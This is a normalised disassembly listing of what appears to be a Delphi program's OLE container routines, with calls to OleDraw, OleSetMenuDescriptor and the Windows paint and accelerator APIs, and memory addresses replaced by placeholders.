xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46901a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469021
lea eax [ ebp - 0x10 ]
call sub_405a38
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x1
xor eax eax
push ebp
push sub_468ffd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x0
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov edx ebx
call sub_41a468
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_465e34
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_468d40
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_469028
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_4049a0
xor eax eax
push ebp
push sub_4690cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_467d54
mov [ ebp - 0x10 ] esi
mov eax rw-data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ esi ] 0x9
je r-xdata
mov eax 0x8
mov eax 0x4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4690d6
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_404a70
retn
lea edx [ ebp - 0x30 ]
call sub_464b7c
push 0x0
lea edx [ ebp - 0x30 ]
push edx
push 0x0
lea edx [ ebp - 0x10 ]
push edx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
sub_4690e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] 0x8
mov eax edi
call sub_404e30
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_469130
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_469028
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469137
mov eax [ ebp - 0x8 ]
push eax
call SysFreeString
retn
sub_469140
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax esi
call sub_4599ec
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
cmp esi [ edi + 0x27c ]
jne r-xdata
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
xor eax eax
mov [ edi + 0x27c ] eax
mov [ edi + 0x27c ] esi
jmp r-xdata
cmp esi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_443d6c
sub_469190
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4691de
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_413af0
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_468e50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4691e5
lea eax [ ebp - 0x10 ]
call sub_40f300
retn
sub_4691ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ecx ]
xor eax eax
push ebp
push j_sub_4036d4#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
add eax 0x25f
cmp eax 0x7
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_469221 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403430
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403430
jmp r-xdata
cmp [ ecx + 0x8 ] 0x2
jl r-xdata
cmp [ ecx + 0x8 ] 0x0
jle r-xdata
cmp [ ecx + 0x8 ] 0x4
jl r-xdata
lea eax [ ebx + 0x10 ]
call sub_40ff1c
mov [ ebp - 0xe ] ax
mov eax ebx
call sub_40ff1c
mov edi eax
sub esi 0xfffffda4
je r-xdata
mov eax ebx
call sub_40ff1c
mov [ ebp - 0xf ] al
lea edx [ ebp - 0xf ]
mov eax [ ebp - 0x4 ]
mov si 0xffba
call sub_403430
test [ ebx + 0x1 ] 0x40
je r-xdata
lea eax [ ebx + 0x30 ]
call sub_40ff1c
mov edi eax
and edi 0x7
lea eax [ ebx + 0x20 ]
call sub_40ff1c
and eax 0x7
mov [ ebp - 0xc ] eax
mov al [ edi + rw-data ]
mov [ ebp - 0x6 ] al
mov al [ edi + rw-data ]
mov edx [ ebp - 0xc ]
or al [ edx + rw-data ]
mov [ ebp - 0x5 ] al
lea eax [ ebx + 0x10 ]
call sub_40ff1c
mov edi eax
mov eax ebx
call sub_40ff1c
mov [ ebp - 0xc ] eax
sub esi 0xfffffda1
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbb
call sub_403430
sub esi 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
mov dl [ ebp - 0xf ]
mov [ eax ] dl
jmp r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd3
call sub_403430
dec esi
je r-xdata
mov eax [ ebx + 0x18 ]
mov dx [ ebp - 0xe ]
mov [ eax ] dx
jmp r-xdata
test [ ebx + 0x11 ] 0x40
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbc
call sub_403430
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx edi
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_403430
jmp r-xdata
dec esi
jne r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd5
call sub_403430
jmp r-xdata
sub_4693e8
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0xbd00
jb r-xdata
mov eax [ esi ]
sub eax 0xb008
je r-xdata
cmp eax 0xbd08
ja r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x230 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446db4
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
jmp r-xdata
mov eax ebx
call sub_4493d8
mov [ esp ] eax
mov eax [ esi ]
sub eax 0xbc00
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov [ esp + 0xc ] eax
call GetMessageTime
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] 0x115de1f1
mov [ esp + 0x18 ] 0x115de1f1
push esp
mov eax [ ebx + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
push 0xfffffd41
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
push 0xfffffd40
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
push 0xfffffd43
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
add esp 0x1c
pop esi
pop ebx
retn
sub_4694d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
setne [ ebp - 0x5 ]
xor eax eax
push ebp
push j_sub_403800#4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_46958f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_46956c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalSize
mov ecx eax
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469573
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
mov eax [ ebp - 0x4 ]
call sub_4681e4
sub_469596
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4695a5
add [ eax ] eax
add [ eax ] al
jl r-xdata
stc
dec [ ebx + 0x24548df0 ]
inc eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x1
mov eax [ ebx + 0x218 ]
push eax
call OleDraw
cmp [ edi + 0x4 ] 0x0
jne r-xdata
inc eax
add [ ecx - 0x76ffb96b ] dh
retn
add esp 0x50
pop edi
pop esi
pop ebx
retn
push esp
mov eax ebx
call sub_4493d8
push eax
call EndPaint
jmp r-xdata
sub_4695b3
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd8 ]
test al al
jne r-xdata
call sub_403a3c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4039e8
sub_4695d8
push esi
mov esi eax
test [ esi + 0x23d ] 0x4
jne r-xdata
mov eax esi
call sub_4477f4
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4695f8
push ebx
push esi
push edi
add esp 0xffffffb0
mov edi edx
mov ebx eax
test [ ebx + 0x23d ] 0x4
je r-xdata
mov edx edi
mov eax ebx
call sub_447530
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
lea edx [ esp + 0x40 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x1
mov eax [ ebx + 0x218 ]
push eax
call OleDraw
cmp [ edi + 0x4 ] 0x0
jne r-xdata
push esp
mov eax ebx
call sub_4493d8
push eax
call BeginPaint
mov esi eax
add esp 0x50
pop edi
pop esi
pop ebx
retn
push esp
mov eax ebx
call sub_4493d8
push eax
call EndPaint
jmp r-xdata
sub_469668
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
call sub_4599ec
mov edi eax
xor ebx ebx
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
test ebx ebx
je r-xdata
mov ebx edi
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp + 0x4 ]
push eax
mov eax [ esi + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push esi
call sub_469f08
sub_4696c4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4488d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4496dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_46973d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x70 ]
mov edx 0xfffffe0b
mov eax [ ebp - 0x4 ]
call sub_468d38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x0
retn
sub_469748
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44888c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4496dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_4697c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb ecx ecx
mov edx 0xfffffdfe
mov eax [ ebp - 0x4 ]
call sub_468e24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x0
retn
sub_4697d4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4698c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4488fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x6
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4698d0
lea eax [ ebp - 0x14 ]
call sub_40f300
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4496dc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_4698ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax + 0x18 ]
mov edx 0xfffffdff
mov eax [ ebp - 0x4 ]
call sub_468d58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x0
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_467814
lea ecx [ ebp - 0x14 ]
mov edx 0xfffffe00
mov eax [ ebp - 0x4 ]
call sub_469190
sub_4698d4
push ebx
push esi
push edi
add esp 0xffffffd0
mov edi edx
mov ebx eax
mov eax ebx
mov si 0xffb8
call sub_403430
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44881c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
lea eax [ esp + 0x14 ]
xor ecx ecx
mov edx 0x1c
call sub_402c40
mov eax ebx
call sub_4493d8
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x100
mov eax [ edi + 0x4 ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x8 ]
mov [ esp + 0x20 ] eax
push esp
lea eax [ esp + 0x18 ]
push eax
movzx eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
push eax
call IsAccelerator
test eax eax
je r-xdata
lea eax [ esp + 0x14 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
add esp 0x30
pop edi
pop esi
pop ebx
retn
sub_46998c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4599ec
test eax eax
je r-xdata
mov edx esp
mov eax ebx
call sub_442558
push esp
mov eax ebx
call sub_4491d4
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
cmp ebx [ eax + 0x27c ]
je r-xdata
push eax
push 0x0
push 0xfffffffc
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
sub eax 0xfffffd9c
add esp 0x10
pop ebx
retn
sub_4699dc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4599ec
mov esi eax
test esi esi
je r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
cmp ebx [ esi + 0x27c ]
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
pop esi
pop ebx
retn
cmp ebx [ esi + 0x220 ]
jne r-xdata
push 0x0
push ebx
call sub_469dd0
sub_469a24
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_469ad8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call MulDiv
mov esi eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call MulDiv
mov edi eax
test [ ebx + 0x23d ] 0x4
je r-xdata
push esi
push edi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi 0x20
jle r-xdata
cmp edi 0x20
jle r-xdata
mov esi 0x20
mov edi 0x20
sub_469bac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
test [ ebp + 0x14 ] 0x4
je r-xdata
fld [ esi ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_4029fc
mov [ ebx ] eax
fld [ esi + 0x4 ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_4029fc
mov [ ebx + 0x4 ] eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi ]
fwait
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi + 0x4 ]
fwait
jmp r-xdata
xor eax eax
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_469c7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
mov eax ebx
call sub_4491d4
mov [ esi ] eax
cmp [ esi ] 0x0
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi 0x80004005
sub_469cb4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x22c ]
call sub_405a38
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
lea eax [ ebx + 0x230 ]
call sub_405a38
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_469cfa
add [ eax ] al
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop ss
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl 0x1
call sub_469140
xor eax eax
pop ebp
retn 0x4
sub_469d30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov edx ebx
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_405a50
mov eax [ ebp + 0x10 ]
call sub_405a38
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_442558
mov eax [ ebp + 0x14 ]
push esi
lea esi [ ebp - 0x10 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0x7fff
push 0x7fff
push 0x0
push 0x0
mov eax [ ebp + 0x18 ]
push eax
call SetRect
xor eax eax
mov [ esi + 0x4 ] eax
mov eax ebx
call sub_4491ec
mov [ esi + 0x8 ] eax
xor eax eax
mov [ esi + 0xc ] eax
xor eax eax
mov [ esi + 0x10 ] eax
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub edx 0xfffffda8
sub_469dd0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x0
push ebx
call sub_469f08
xor edx edx
mov eax ebx
call sub_469140
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_469ec8
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ ebp + 0x8 ]
call sub_46863c
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0xc
push 0x2
mov edx [ ebp + 0x10 ]
push edx
push 0x5
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0x2
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
call sub_456b3c
sub_469f08
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
call sub_46863c
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn 0x10
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_456b8c
push 0x0
push 0x0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call OleSetMenuDescriptor
sub_46a00c
adc esp [ ecx - 0x5ef7ffba ]
inc esi
add [ esi ] bl
mov eax [ 0xffffffffa0fd0046 ]
inc esi
add dl dh
mov al [ 0xffffffffa0e20046 ]
inc esi
add bh cl
mov al [ 0xffffffffa11e0046 ]
inc esi
add [ esi ] bl
mov eax [ 0xffffffffa0c40046 ]
inc esi
add [ edx - 0x5effb960 ] dh
mov al [ 0xffffffffa0730046 ]
inc esi
add [ ecx - 0x60 ] bl
inc esi
add [ eax - 0x60 ] cl
inc esi
add [ ebx + 0x70568bc3 ] cl
mov cl 0xfc
call sub_4136f4
jmp sub_46a12a
sub_46a073
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
mov esi [ esi + 0x68 ]
cmp [ esi + 0x59 ] 0x0
je r-xdata
mov esi [ eax + 0x68 ]
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_467814
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_40f614
jmp sub_46a12a
sub_46a160
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_46a364
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403800#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
sub eax 0xfffffdfe
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_46a263
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdfe
mov eax [ ebp + 0x8 ]
call sub_46868c
cmp ax 0x1
sbb edx edx
inc edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
dec eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a36b
lea eax [ ebp - 0x10 ]
call sub_40f300
retn
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_46a325
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdff
mov eax [ ebp + 0x8 ]
call sub_468628
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x68 ]
call sub_423aa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
sub eax 0xb
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_46a2c8
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx 0xfffffe00
mov eax [ ebp + 0x8 ]
call sub_4687ac
lea eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x68 ]
call sub_467860
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_46a200
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffe0b
mov eax [ ebp + 0x8 ]
call sub_468628
mov edx eax
mov eax [ ebp + 0x8 ]
call sub_442d58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x0
retn
sub_46a39c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46a3cd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a3d4
retn
mov eax rw-data
call sub_40f300
sub_46a3d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46a420
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a427
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
